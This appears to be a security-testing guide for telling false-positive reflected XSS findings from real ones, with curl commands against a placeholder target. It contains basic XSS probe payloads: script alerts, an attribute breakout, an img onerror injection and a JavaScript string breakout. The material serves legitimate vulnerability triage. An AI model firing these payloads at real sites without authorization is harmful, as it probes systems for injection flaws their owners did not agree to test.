# XSS False Positive Validation

## Common False Positives

### 1. HTML Entity Encoding
The browser auto-escapes HTML entities. The payload is reflected but harmless.
```bash
# Input: <script>alert(1)</script>
# Output in page source: &lt;script&gt;alert(1)&lt;/script&gt;
# → FALSE POSITIVE (HTML-encoded)
```

**Confirm:** Check raw page source (not rendered DOM). Look for `&lt;` `&gt;`.

### 2. Attribute Context Only
Payload reflected inside a quoted attribute — not breakable.
```html
<input value="<script>alert(1)</script>">
```
**Confirm:** Try breaking the attribute first:
```html
"><script>alert(1)</script>
```
If `>` is encoded → not exploitable in this context.

### 3. Content-Type Blocks Execution
API returns `Content-Type: application/json` or `text/plain`.
```bash
curl -sI "https://target.com/api/search?q=<script>alert(1)</script>"
# Content-Type: application/json → browser won't execute
```
**True only if:** Another endpoint renders this API data unsanitized (stored XSS).

### 4. Self-XSS (no impact)
Payload only affects your own session, no way to deliver to others.
```bash
# Example: Your profile "name" field reflects XSS
# But no other user sees your profile name
# → Informational only
```

### 5. WAF Reflection (fake positive)
WAF reflects your payload in an error page — no real execution context.
```bash
# Input: <script>
# Response: 406 Blocked by WAF: "<script>"
# → FALSE POSITIVE (never reached the app)
```

## Confirmation Criteria

| Indicator | Confident? |
|-----------|------------|
| Payload raw in response (no encoding) | ✅ Strong signal |
| Alert box executes in browser | ✅ Confirmed |
| CSP headers present | ⚠️ Check for bypass |
| Only reflected in JSON | ❌ Low unless stored |
| Only reflected in error page | ❌ Likely WAF |

## 3-Step Validation

### Step 1: Probe Reflection
```bash
curl "https://target.com/search?q=PROBE_STRING_12345"
# Search response body for PROBE_STRING_12345
```

### Step 2: Test Encoding
```bash
curl "https://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
# Check if < is encoded to &lt; or kept as <
```

### Step 3: Confirm Context
```bash
# HTML context test:
curl "https://target.com/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E"
# Check if <img appears raw

# JS context test:
curl "https://target.com/search?q=test%27%2Balert(1)%2B%27"
# Check if ' appears unescaped
```
